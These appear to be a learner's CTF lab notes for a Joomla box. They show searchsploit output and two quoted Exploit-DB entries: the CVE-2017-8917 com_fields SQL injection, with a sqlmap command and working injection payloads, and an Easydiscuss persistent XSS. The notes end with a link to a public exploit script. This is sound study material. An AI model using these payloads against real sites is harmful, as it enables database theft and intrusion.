
```sh
┌──(kali㉿kali)-[~]
└─$ searchsploit joomla 3.7.0            
-------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                              |  Path
-------------------------------------------------------------------------------------------- ---------------------------------
Joomla! 3.7.0 - 'com_fields' SQL Injection                                                  | php/webapps/42033.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                               | php/webapps/43488.txt
-------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```


```sh
┌──(kali㉿kali)-[~/thm/dailybugle]
└─$ cat 42033.txt                                           
# Exploit Title: Joomla 3.7.0 - Sql Injection
# Date: 05-19-2017
# Exploit Author: Mateus Lino
# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
# Vendor Homepage: https://www.joomla.org/
# Version: = 3.7.0
# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
# CVE : - CVE-2017-8917


URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27


Using Sqlmap:

sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]


Parameter: list[fullordering] (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (DUAL)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)

    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)            ```


```sh
┌──(kali㉿kali)-[~/thm/dailybugle]
└─$ cat 43488.txt 
# Exploit Title: Joomla Plugin Easydiscuss <4.0.21 Persistent XSS in Edit Message
# Date: 06-01-2018
# Software Link: https://stackideas.com/easydiscuss
# Exploit Author: Mattia Furlani
# CVE: CVE-2018-5263
# Category: webapps

1. Description

Whenever a user edits a message with <\textarea> inside the body, everything after the <\textarea> will be executed in the user’s browser. Works with every version up to 4.0.20


2. Proof of Concept

Login with permissions to post a message, insert <\textarea> in the body and add any html code after that, whenever a user tries to edit that message the code writed after you closed the textarea will be executed


3. Solution:

Update to version 4.0.21
https://stackideas.com/blog/easydiscuss4021-update  
```

googling: sqli python script 2017-8917

https://github.com/stefanlucas/Exploit-Joomla

messing with the script. made it py3
making it shorter, to understand better


